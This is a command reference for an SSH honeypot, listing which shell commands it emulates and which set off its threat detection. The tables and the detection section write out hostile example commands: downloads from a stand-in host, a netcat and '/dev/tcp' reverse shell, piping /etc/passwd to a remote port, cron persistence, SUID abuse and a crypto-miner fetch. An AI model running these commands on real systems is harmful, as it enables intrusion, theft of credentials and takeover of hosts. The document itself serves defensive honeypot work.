# Commands Reference — SSH Honeypot

All 40+ emulated commands grouped by category. Each attacker session gets these commands available.

**Legend:** ✅ Fully emulated | ⚡ Partially emulated | 🎭 Simulated (realistic-looking fake output)

---

## System & Information

| Command | Status | Example | Notes |
|---------|--------|---------|-------|
| `uname -a` | ✅ | `uname -a` | Returns fake kernel info |
| `uname -r` | ✅ | `uname -r` | Kernel version |
| `uname -m` | ✅ | `uname -m` | Architecture: x86_64 |
| `arch` | ✅ | `arch` | x86_64 |
| `hostname` | ✅ | `hostname` | ubuntu-server-01 |
| `uptime` | ✅ | `uptime` | Static "42 days" uptime |
| `date` | ✅ | `date` | Real current date |
| `cal` | ✅ | `cal`, `cal 2024` | Calendar display |
| `whoami` | ✅ | `whoami` | corpuser or root |
| `id` | ✅ | `id` | UID, GID, groups |
| `env` | ✅ | `env` | Environment variables |
| `printenv` | ✅ | `printenv HOME` | Specific variable |
| `history` | ✅ | `history` | Session command history |
| `clear` | ✅ | `clear` | Clears terminal |
| `help` | ✅ | `help` | Shows available commands |
| `exit` | ✅ | `exit` | Closes session |
| `logout` | ✅ | `logout` | Closes session |

---

## File System Operations

| Command | Status | Example | Notes |
|---------|--------|---------|-------|
| `ls` | ✅ | `ls`, `ls -la /etc`, `ls -l` | Full VFS listing with permissions |
| `pwd` | ✅ | `pwd` | Current directory |
| `cd` | ✅ | `cd /etc`, `cd ..`, `cd ~` | Full directory navigation |
| `cat` | ✅ | `cat /etc/passwd` | Reads VFS files; logs sensitive access |
| `head` | ✅ | `head -20 /etc/passwd` | First N lines |
| `tail` | ✅ | `tail -f /var/log/auth.log` | Last N lines |
| `wc` | ✅ | `wc -l /etc/passwd` | Line/word/char count |
| `file` | ✅ | `file /etc/passwd` | File type detection |
| `touch` | ✅ | `touch newfile.txt` | Creates file in VFS |
| `mkdir` | ✅ | `mkdir -p /tmp/work` | Creates directories in VFS |
| `rm` | ✅ | `rm file.txt`, `rm -rf /tmp/*` | Removes from VFS |
| `rmdir` | ✅ | `rmdir emptydir` | Remove empty directory |
| `cp` | ✅ | `cp src.txt dst.txt` | VFS copy |
| `mv` | ✅ | `mv old.txt new.txt` | VFS rename/move |
| `find` | ✅ | `find / -name "*.conf"` | VFS filesystem search |
| `grep` | ✅ | `grep root /etc/passwd` | Pattern matching in VFS files |
| `which` | ✅ | `which python3` | Binary lookup in /bin |
| `echo` | ✅ | `echo "hello"`, `echo $VAR` | Text output |

### Output Redirection (Partially Supported)
| Operator | Status | Example |
|----------|--------|---------|
| `>` (overwrite) | ✅ | `echo "test" > /tmp/file.txt` |
| `>>` (append) | ✅ | `echo "more" >> /tmp/file.txt` |
| `<` (input redir) | ❌ Not yet | `cat < file.txt` |
| `\|` (pipe) | ❌ Not yet | `ls \| grep admin` |

---

## Network Commands

| Command | Status | Example | Notes |
|---------|--------|---------|-------|
| `ifconfig` | ✅ | `ifconfig` | Fake eth0 + lo |
| `ip addr` | ✅ | `ip addr`, `ip a` | Fake network interfaces |
| `ip route` | ✅ | `ip route` | Fake routing table |
| `netstat` | 🎭 | `netstat -an` | Static listening ports table |
| `ss` | 🎭 | `ss -tlnp` | Static socket statistics |
| `ping` | 🎭 | `ping 8.8.8.8` | Simulated ping output + threat logged |
| `wget` | ⚡ | `wget http://evil.com/shell.sh` | Simulated download + threat logged |
| `curl` | ⚡ | `curl http://evil.com` | Simulated response + threat logged |
| `arp` | 🎭 | `arp -a` | Static ARP table |
| `nc` / `ncat` | 🎭 | `nc -e /bin/bash` | Simulated + high severity alert |
| `telnet` | 🎭 | `telnet 192.168.1.1` | Simulated + threat logged |
| `nmcli` | 🎭 | `nmcli dev status` | Simulated network manager output |

---

## User & Privilege

| Command | Status | Example | Notes |
|---------|--------|---------|-------|
| `whoami` | ✅ | `whoami` | corpuser or root |
| `id` | ✅ | `id` | UID, groups |
| `su` | ⚡ | `su`, `su root` | Escalates to root; threat logged |
| `sudo` | ⚡ | `sudo id` | Simulated with auth; threat logged |
| `passwd` | 🎭 | `passwd` | Prompts but doesn't change anything |
| `last` | 🎭 | `last` | Static login history |
| `w` | 🎭 | `w` | Static "who is logged in" output |

**Privilege Escalation Flow:**
```
corpuser@ubuntu-server-01$ su
Password:         (any password accepted in open mode)
root@ubuntu-server-01:~#  (now in /root with uid=0)
```

---

## Process Monitoring

| Command | Status | Example | Notes |
|---------|--------|---------|-------|
| `ps` | ✅ | `ps`, `ps aux`, `ps ef` | Static process table |
| `top` | 🎭 | `top` | Simulated once, doesn't refresh |
| `kill` | 🎭 | `kill 1234` | Simulated (no real processes) |

---

## Text Editors

| Command | Status | Example | Notes |
|---------|--------|---------|-------|
| `nano` | ✅ | `nano file.txt` | Full TUI: arrow keys, scrolling, Ctrl+O save, Ctrl+X exit |
| `vi` / `vim` | 🎭 | `vi file.txt` | Shows file content, prints "vim not available" |

**Nano Features:**
- Arrow key navigation
- Scrolling for long files
- `Ctrl+O` to save
- `Ctrl+X` to exit
- New file creation
- Existing file editing

---

## System Information

| Command | Status | Example | Notes |
|---------|--------|---------|-------|
| `df` | ✅ | `df -h`, `df` | Disk space (static fake values) |
| `du` | ⚡ | `du -sh /home` | Approximate sizes |
| `free` | 🎭 | `free -h` | Static memory info |
| `lscpu` | 🎭 | `lscpu` | CPU info from /proc/cpuinfo |

---

## Scripting & Programming

| Command | Status | Example | Notes |
|---------|--------|---------|-------|
| `python3` | ⚡ | `python3 -c "print('hello')"` | Restricted execution; `-c` flag logs threat |
| `python` | ⚡ | `python -c "..."` | Same as python3 |
| `perl` | 🎭 | `perl -e "print 'hi'"` | Simulated + threat logged |
| `bash` | 🎭 | `bash -i >& /dev/tcp/...` | Threat logged (reverse shell pattern) |
| `sh` | 🎭 | `sh script.sh` | Simulated |

---

## Commands That Trigger Threat Detection

Run these in your test sessions to see the threat engine in action:

```bash
# RECON
uname -a                    # T1082 - OS discovery
cat /etc/passwd             # T1087 - User enumeration
ps aux                      # T1057 - Process enum
netstat -an                 # T1049 - Network connections
find / -name "*.conf"       # T1083 - File system enum

# CREDENTIAL HUNTING
cat /home/corpuser/secret.txt  # T1552 - Credential access
cat /etc/shadow                # T1552 - Shadow file
ls /root/.ssh/                 # After su: key harvesting

# PRIVILEGE ESCALATION
su                          # T1548 - Privilege escalation
sudo id                     # T1548 - Sudo abuse
chmod 4755 /tmp/bash        # T1166 - SUID abuse

# EXFILTRATION
wget http://evil.com/shell.sh  # T1048 - Data transfer
curl http://evil.com           # T1041 - Exfil over C2
python3 -c "import base64"     # T1048 - Encoding
cat /etc/passwd | nc 1.2.3.4 9999  # T1041

# PERSISTENCE
echo "* * * * * bash" >> /etc/crontab  # T1053 - Cron job
cat /root/.ssh/authorized_keys  # T1098 - Account manipulation

# MALWARE
wget http://evil.com/xmrig     # T1496 - Crypto mining
```

---

## Not Yet Implemented

| Feature | Priority | Est. Time |
|---------|----------|-----------|
| Piping (`ls \| grep`) | High | 8h |
| Input redirection (`cat < file`) | Medium | 3h |
| Job control (`cmd &`, `jobs`) | Medium | 4h |
| Env var expansion (`$HOME`, `${VAR}`) | High | 2h |
| Glob patterns (`ls *.txt`) | Medium | 2h |
| `chmod` / `chown` (VFS) | Low | 2h |
| `tar` / `gzip` | Low | 2h |
| `ssh` (lateral movement sim) | Medium | 4h |
| `crontab -e` (persistence sim) | High | 2h |
| Symbolic links | Low | 4h |
